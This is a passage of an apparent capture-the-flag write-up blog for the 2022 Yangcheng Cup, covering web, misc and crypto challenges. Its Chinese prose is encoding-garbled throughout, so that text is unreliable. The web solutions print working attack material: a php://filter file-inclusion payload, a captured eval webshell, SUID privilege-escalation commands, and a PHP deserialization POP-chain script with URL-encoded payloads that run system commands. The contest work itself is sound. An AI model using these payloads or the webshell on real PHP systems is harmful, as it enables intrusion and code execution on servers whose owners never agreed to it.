    <content type="html"><![CDATA[<p>â€‹    </p><p>å¤§èµ›ç”±ä¸­å…±å¹¿å·å¸‚å§”ç½‘ç»œå®‰å…¨å’Œä¿¡æ¯åŒ–å§”å‘˜ä¼šåŠå…¬å®¤ä½œä¸ºæŒ‡å¯¼å•ä½ï¼Œå¹¿å·å¸‚ç½‘ç»œå®‰å…¨äº§ä¸šä¿ƒè¿›ä¼šä¸»åŠï¼Œå¹¿ä¸œå¤–è¯­å¤–è´¸å¤§å­¦ã€æ­å·å®‰æ’ä¿¡æ¯æŠ€æœ¯è‚¡ä»½æœ‰é™å…¬å¸æ‰¿åŠï¼Œå¹¿å·å¸‚ä¿¡æ¯å®‰å…¨æµ‹è¯„ä¸­å¿ƒã€å¹¿å·äº’è”ç½‘åä¼šååŠã€‚</p><p>å¤§èµ›ä»¥â€œç½‘ç»œå®‰å…¨ä¸ºäººæ°‘ã€ç½‘ç»œå®‰å…¨é äººæ°‘â€ä¸ºä¸»é¢˜ï¼Œæ—¨åœ¨é€šè¿‡ç«èµ›çš„æ–¹å¼æé«˜å‚èµ›é€‰æ‰‹æ”»é˜²å…¼å¤‡çš„ç½‘ç»œå®‰å…¨å®è·µæŠ€èƒ½ï¼Œå®ç°ä»¥èµ›ä¿ƒå­¦ã€ä»¥èµ›ä¼šå‹ï¼ŒåŠ å¼ºä¸åŒé™¢æ ¡åŠå•ä½é—´çš„æŠ€æœ¯äº¤æµã€‚</p><p>æœ¬å±Šå¤§èµ›ç”±ã€å¹¿å¤–å¥³ç”Ÿæˆ˜é˜Ÿã€‘ä¸æ­å·å®‰æ’ä¿¡æ¯æŠ€æœ¯è‚¡ä»½æœ‰é™å…¬å¸å…±åŒå‘½é¢˜ï¼Œé‡‡ç”¨CTFï¼ˆå¤ºæ——èµ›ï¼‰å›¢é˜Ÿç«èµ›æ¨¡å¼ï¼Œå‚èµ›é˜Ÿä¼é€šè¿‡äº’è”ç½‘åœ¨çº¿è§£é¢˜ï¼Œé¢˜ç›®ç±»å‹æ¶‰åŠWebå®‰å…¨ã€é€†å‘å·¥ç¨‹ (Reverse)ã€äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜å’Œåˆ©ç”¨ï¼ˆPwnï¼‰ã€å¯†ç å­¦ï¼ˆCryptoï¼‰ã€æ‚é¡¹ï¼ˆMiscï¼‰ç­‰ç±»åˆ«ã€‚</p><p>æ¯”èµ›æ—¶é—´ï¼š9æœˆ3æ—¥ 9:00 - 9æœˆ4æ—¥ 9:00</p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h3><blockquote><p>ç®€å•web</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])) ? highlight_file(<span class="keyword">__FILE__</span>) : <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fliter</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">     <span class="variable">$blacklist</span> = [<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;create&quot;</span>,<span class="string">&quot;install&quot;</span>,<span class="string">&quot;pear&quot;</span>];</span><br><span class="line">         <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(stristr(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(fliter(<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Noooo0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>éé¢„æœŸã€‚Dirsearchæ‰«ä¸€ä¸‹å‘ç°ä»–äººä¸Šä¼ çš„shell.phpï¼Œåˆ©ç”¨fileå‚æ•°include+ä¼ªåè®®åŒ…å«ä¸€ä¸‹ï¼š</p><p><code>?file=php://filter/read=convert.base64-encode/resource=shell.php</code></p><p>base64è§£ç å¾—åˆ°æºç ï¼š<code>&lt;?php @eval($_POST[a]);?&gt;</code></p><p>ç”¨èšå‰‘è¿æ¥ä¸Šï¼Œåœ¨æ ¹ç›®å½•ä¸‹å‘ç°flagï¼Œä½†æ˜¯æƒé™ä¸å¤Ÿæ— æ³•æŸ¥çœ‹ã€‚</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code> æŸ¥çœ‹å…·æœ‰SUIDæƒé™çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå‘ç°dateå‘½ä»¤å¯ç”¨ï¼Œææƒï¼š</p><p><code>date -f /flag</code></p><p>åœ¨æŠ¥é”™æ–‡å­—ä¸­è·å–flagå†…å®¹ã€‚</p><p>â€‹    </p><h3 id="Safepop"><a href="#Safepop" class="headerlink" title="Safepop"></a>Safepop</h3><blockquote><p>Wake up!Pop corn is not safe food,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t serialize me&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&quot;cat /flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/Test/&quot;</span>,get_class(<span class="keyword">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pop</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;no pop&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>æ‰¾ååºåˆ—åŒ–popé“¾ï¼š</p><p><code>Test/getFlag() &lt;- A/__get($p) &lt;- B/__destruct()</code></p><p>ç”±äºç±»Aå­˜åœ¨è¿‡æ»¤ <code>preg_match(&quot;/Test/&quot;,get_class($this-&gt;a))</code>ï¼Œç±»Aä¸èƒ½è°ƒç±»Testï¼Œåˆ©ç”¨ä¸Šç±»Funï¼š</p><p><code>Fun/__call($f,$p)  &lt;- A/__get($p) &lt;- B/__destruct()</code></p><p>ç¼–å†™è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span>:</span></span><br><span class="line">    private_func = <span class="string">&#x27;system&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    public_a = Fun()</span><br><span class="line">     </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span></span><br><span class="line">    <span class="comment"># public_p = &#x27;ls /&#x27;</span></span><br><span class="line">    public_p = <span class="string">&#x27;cat /flag?&#x27;</span></span><br><span class="line">    public_a = A()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(quote(serialize(B())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O%3A1%3A%22B%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22Fun%22%3A1%3A%7Bs%3A9%3A%22%00Fun%00func%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A1%3A%22p%22%3Bs%3A10%3A%22cat%20/flag%3F%22%3B%7D</span></span><br></pre></td></tr></table></figure><p>ç”±äºç±»Funæœ‰ <code>__wakeup()</code> ä¼šæ¸…ç©º <code>private $func</code>ï¼Œä¿®æ”¹æ•°å­—ç»•è¿‡ <code>__wakeup()</code>ï¼š</p><p><code>O%3A1%3A%22B%22%3A3%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22Fun%22%3A1%3A%7Bs%3A9%3A%22%00Fun%00func%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A1%3A%22p%22%3Bs%3A10%3A%22cat%20/flag%3F%22%3B%7D</code></p><p>ä¼ å…¥popå‚æ•°å¾—åˆ°flagã€‚</p><p>â€‹    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="where-is-secret"><a href="#where-is-secret" class="headerlink" title="where_is_secret"></a>where_is_secret</h3><blockquote><p>easy_misc</p></blockquote><p>ä¸€ä¸ªvig.txtå’Œä¸€ä¸ªzipå‹ç¼©åŒ…ï¼Œtxtä¸­æ–‡å­—</p><p><code>Naseu bybkjkl, O wt mna Wkkopwkja hl Qrkgeux Fasxtorr. Zdl Kaozbgj hksu oty fblz hhntyoxj wu tzphvq ku Nqnhbta, hgj pox Qupo geyiuna ago ixkj jhtpyhrhlw hu aak Nblyehg gntr. Nahkj pvwgu pl QBJ Vxwgr Zdbkyzhr, O jlxj ovfkkux zk ikojn fk 29.94 bpgmay-layrbtc vkocpggh jaoyrxt wz kgpphto uhc. Soxt E yxvas mna Ynyoptt wyfe, E dbrh pgbeax ekb mu yvfk pv Nqnhbta ah ha aak rpvk lyxyekxtp.aak lhlysvkj ez ZCDA@K1tz0frjo</code></p><p>ä½¿ç”¨<a href="https://guballa.de/vigenere-solver">åœ¨çº¿ç»´å‰å°¼äºšå¯†ç è§£å¯†ç½‘ç«™</a>è§£å‡ºæ˜æ–‡ï¼š</p><p><code>Hello friends, I am the President of Ukraine Zelensky. The Russian army has just launched an attack on Ukraine, and the Kyiv airport has been controlled by the Russian army. Heard today is KFC Crazy Thursday, I need someone to bring me 29.94 finger-sucking original chicken as rations now. When I repel the Russian army, I will invite you to come to Ukraine to be the vice president.the password is GWHT@R1nd0yyds</code></p><p>ç”¨å¯†ç  <code>GWHT@R1nd0yyds</code> è§£å‹zipï¼Œå¾—åˆ°ä¸€å¼ bmpå›¾ï¼Œæ ¹æ®æ¯”èµ›ä¸­æœŸæ”¾çš„hintæç¤ºåŠ å¯†è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">text</span>):</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(text)</span><br><span class="line">    width = math.ceil(str_len ** <span class="number">0.5</span>)</span><br><span class="line">    im = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, width), <span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        index = <span class="built_in">ord</span>(i)</span><br><span class="line">        rgb = (<span class="number">0</span>, (index &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>, index &amp; <span class="number">0xFF</span>)</span><br><span class="line">        im.putpixel((x, y), rgb)</span><br><span class="line">        <span class="keyword">if</span> x == width - <span class="number">1</span>:</span><br><span class="line">            x = <span class="number">0</span></span><br><span class="line">            y += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> im</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;829962.txt&quot;</span>, encoding=<span class="string">&quot;gbk&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        all_text = f.read()</span><br><span class="line"></span><br><span class="line">        im = encode(all_text)</span><br><span class="line">        im.save(<span class="string">&quot;out.bmp&quot;</span>)</span><br></pre></td></tr></table></figure><p>é€šè¿‡çˆ†ç ´æ–¹æ³•é€†å›åŸæ–‡æœ¬å³å¯ï¼Œå‘ç°åŸæ–‡ä¸ºä¸€æœ¬ä¹¦ï¼ŒåŒ…å«å¤§é‡ä¸­æ–‡ï¼Œè¿˜åŸæ—¶è®¾ç½®ä¸è¾“å‡ºä¸­æ–‡ï¼Œç¼©çŸ­è¿è¡Œæ—¶é—´ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">r&#x27;out.bmp&#x27;</span>)</span><br><span class="line">width, height = img.size</span><br><span class="line"></span><br><span class="line">text=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">x, y = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">       r,g,b = img.getpixel((x,y))</span><br><span class="line">       <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">126</span>):</span><br><span class="line">           <span class="keyword">if</span> ((j &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>) == g <span class="keyword">and</span> j &amp; <span class="number">0xFF</span> == b:</span><br><span class="line">               text+=<span class="built_in">chr</span>(j)</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="keyword">pass</span></span><br><span class="line">       <span class="keyword">if</span> x == width - <span class="number">1</span>:</span><br><span class="line">           x = <span class="number">0</span></span><br><span class="line">           y += <span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x,y)</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">r&#x27;text.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(text)</span><br></pre></td></tr></table></figure><p>åœ¨å¾—åˆ°çš„å­—ç¬¦é‡Œï¼Œæ‰¾åˆ°flagæ ¼å¼çš„ä¸”å¸¦æœ‰æ„ä¹‰çš„å­—ç¬¦ï¼Œç»„æˆflagï¼š<code>flag&#123;h1d3_1n_th3_p1ctur3&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="è¿·å¤±å¹»å¢ƒ"><a href="#è¿·å¤±å¹»å¢ƒ" class="headerlink" title="è¿·å¤±å¹»å¢ƒ"></a>è¿·å¤±å¹»å¢ƒ</h3><blockquote><p>èµ°ä¸å‡ºè‡ªè´£ç©ºé—´ï¼Œæ²‰æººäºæˆ‘ä»¬æ˜¨å¤©ï¼Œè¿˜èƒ½ä¸èƒ½ç›¸è§ã€‚</p></blockquote><p>ç”¨DiskGeniusæ‰“å¼€vmdkæ–‡ä»¶ï¼Œåœ¨å›æ”¶ç«™å‘ç°ä¸€å¼ å¯è‰jpgå›¾ç‰‡å’Œä¸€å¼ æ— æ–‡ä»¶ç±»å‹åç¼€çš„å¹»å¢ƒpngå›¾ç‰‡ï¼Œæå–å‡ºæ¥ã€‚</p><p>åœ¨â€œè¿·å¤±å¹»å¢ƒâ€å¤¹å­é‡Œæœ‰1å¼ å¯è‰jpgå›¾ç‰‡å’Œ100å¼ ä¸€æ ·çš„å¹»å¢ƒpngå›¾ç‰‡ï¼Œå‰åç›¸åŒå›¾ç‰‡çš„å¤§å°ä¸åŒï¼Œå°è¯•ç›²æ°´å°æå–ä¿¡æ¯ä¸æˆåŠŸï¼Œå†å°è¯•å°†å¹»å¢ƒpngå¤§å›¾ä¸å°å›¾è¿›è¡Œå‡ï¼ˆsubï¼‰æ“ä½œï¼Œå¾—åˆ°</p><p><img src="/2022/09/04/match-2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/solved.bmp" alt="solved" style="zoom:80%;"></p><p>keyä¸º <code>å¯è‰å‰æ¥æŠ¥é“</code>ã€‚</p><p>å›æ”¶ç«™é‡Œå¯è‰jpgå›¾ç‰‡å­˜åœ¨å¤‡æ³¨ä¿¡æ¯ <code>çŒœä¸åˆ°ï¼Œæ€ä¹ˆæƒ³éƒ½çŒœä¸åˆ°å§ã€‚</code>ï¼Œç”¨outguessæå–ï¼š</p><p><code>outguess -r keli.jpg -k &quot;å¯è‰å‰æ¥æŠ¥é“&quot; -t out.txt</code></p><p>å¾—åˆ°flagï¼š<code>DASCTF&#123;f473a6fd2de17a0c5794414b3905ebbe&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="ç­¾ä¸ªåˆ°"><a href="#ç­¾ä¸ªåˆ°" class="headerlink" title="ç­¾ä¸ªåˆ°"></a>ç­¾ä¸ªåˆ°</h3><blockquote><p>ç­¾ä¸ªåˆ°ï¼Œè¯·æ³¨æ„ï¼Œæœ¬æ¬¡æ¯”èµ›æ‰€æœ‰ flag æäº¤æ—¶éƒ½åªéœ€è¦æäº¤æ‹¬å·å†…çš„å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚è¿™ä¸ªé¢˜çš„ flag å¦‚æœæ˜¯ flag{xxx}, æ‚¨åªéœ€è¦æäº¤ xxx å³å¯å¾—åˆ†ã€‚</p></blockquote><p><code>ZMJTPM33TIGQTLMDTV4JXLYQTNMQTAOLTSGTRMOLZD2JPMOETIEQBZ3PTZ2U2===</code>ï¼Œåˆçœ‹ä¸ºbase32ï¼Œè§£ç ä¸ºä¹±ç ã€‚</p><p><code>flag&#123;</code> å¯¹åº”base32ç¼–ç ä¸º <code>MZWGCZ33</code>ï¼Œæ•…ä¸ºrot13+base32ï¼Œè§£ç å¾— <code>flag&#123;5f3c029eac023481fbd8d5ad15b73b34&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="LRSA"><a href="#LRSA" class="headerlink" title="LRSA"></a>LRSA</h3><blockquote><p>RSA and some other things</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPQ</span>(<span class="params">p,q</span>):</span></span><br><span class="line">    P=getPrime(<span class="number">2048</span>)</span><br><span class="line">    Q=getPrime(<span class="number">2048</span>)</span><br><span class="line">    t=(p*P-<span class="number">58</span>*P+q)%Q</span><br><span class="line">    <span class="keyword">assert</span> (isPrime(Q))</span><br><span class="line">    <span class="keyword">return</span> P,Q,t</span><br><span class="line"></span><br><span class="line">B=getRandomNBitInteger(<span class="number">11</span>)</span><br><span class="line">p=getPrime(B)</span><br><span class="line">q=getPrime(B)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">P,Q,t=getPQ(p,q)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;B=&quot;</span>,B)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P*P*Q=&quot;</span>,P*P*Q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P*Q*Q=&quot;</span>,P*Q*Q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;t=&quot;</span>,t)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br></pre></td></tr></table></figure></blockquote><p>$\gcd(P \cdot P \cdot Q,P \cdot Q \cdot Q)=P \cdot Q$ï¼Œç»§è€Œæ±‚å¾— $P$ å’Œ $Q$ï¼Œåˆæœ‰ $t=(P \cdot(p-58)+q) \bmod Q$ï¼Œæ„é€ æ ¼ $\begin{bmatrix} 1 &amp; P \newline 0 &amp; Q \end{bmatrix}$ï¼Œåˆ©ç”¨LLLç®—æ³•è§„çº¦å¾—åˆ° $p-58$ å’Œ $q$ å€¼ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">B = <span class="number">1023</span></span><br><span class="line">PPQ = <span 